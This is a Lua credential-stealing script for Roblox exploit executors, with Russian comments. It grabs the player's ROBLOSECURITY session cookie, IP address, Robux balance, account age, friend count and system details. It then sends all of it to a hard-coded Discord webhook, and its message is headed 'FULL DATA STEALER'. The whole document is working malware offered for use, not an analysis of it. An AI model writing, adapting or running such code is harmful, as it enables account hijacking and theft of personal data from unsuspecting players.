local webhook = "https://discord.com/api/webhooks/1431427795682328698/mUTGrbjd0Cy_WeR0dfOaLyocTQGAEH-KuK6F54lvIir0T3NGoVD0Nfpe0LUIGpScfoxj"

local request = (syn and syn.request) or http_request or (http and http.request)
if not request then return end

-- Получение куки разными методами
local cookie = "not_found"
local success, result = pcall(function()
    return game:HttpGet("https://www.roblox.com/game/GetCurrentUser.ashx")
end)
if success and result and #result > 10 then
    cookie = result
else
    pcall(function()
        cookie = game:GetService("Players").LocalPlayer:GetAttribute("ROBLOSECURITY") or "not_found"
    end)
end

-- Получение IP через внешний API
local ip = "unknown"
pcall(function()
    local ipResponse = game:HttpGet("http://api.ipify.org")
    if ipResponse then ip = ipResponse end
end)

-- Сбор всей информации
local player = game.Players.LocalPlayer
local accountAge = "unknown"
local robux = "unknown"
local friendsCount = "unknown"

pcall(function()
    accountAge = player.AccountAge
end)
pcall(function()
    robux = player:GetRobuxBalance()
end)
pcall(function()
    friendsCount = #player:GetFriends()
end)

local hardware = {
    OS = (syn and syn.get_os and syn.get_os()) or "unknown",
    Executor = (identifyexecutor and identifyexecutor()) or "unknown"
}

-- Отправка всех данных в Discord
local message = string.format([[
🚨 **FULL DATA STEALER** 🚨

**📱 Account Info:**
Username: %s
UserID: %s
Account Age: %s days
Robux: %s
Friends: %s

**🔐 Security:**
ROBLOSECURITY: ```%s```
IP Address: %s

**💻 Hardware:**
OS: %s
Executor: %s

**🕒 Time:** %s
]], 
player.Name, player.UserId, accountAge, robux, friendsCount,
cookie, ip, hardware.OS, hardware.Executor, os.date("%Y-%m-%d %H:%M:%S"))

local data = {
    ["content"] = message,
    ["username"] = "Data Stealer",
    ["avatar_url"] = "https://i.imgur.com/7W6hQ3d.png"
}

request({
    Url = webhook,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = game:GetService("HttpService"):JSONEncode(data)
})
